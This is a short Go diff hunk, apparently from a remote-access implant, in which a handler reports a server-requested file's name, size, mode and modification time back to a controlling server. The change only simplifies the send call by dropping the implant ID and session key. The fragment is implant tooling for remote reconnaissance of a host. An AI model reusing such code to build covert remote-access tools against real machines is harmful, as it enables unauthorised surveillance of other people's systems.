@@ -19,5 +19,5 @@ func handleFileInfoReq(conn net.Conn, arguments interface{}) {
 	results, _ := os.Stat(fileInfoReq.PathToFile)
 
 	resp := communication.FileInfoResp{Name: results.Name(), Size: results.Size(), Mode: results.Mode().String(), ModTime: int(results.ModTime().Unix()), IsDir: results.IsDir()}
-	SendEnvelopeToServer(conn, implantId, 12, resp, []byte(sessionKey))
+	SendEnvelopeToServer(conn, 12, resp)
 }
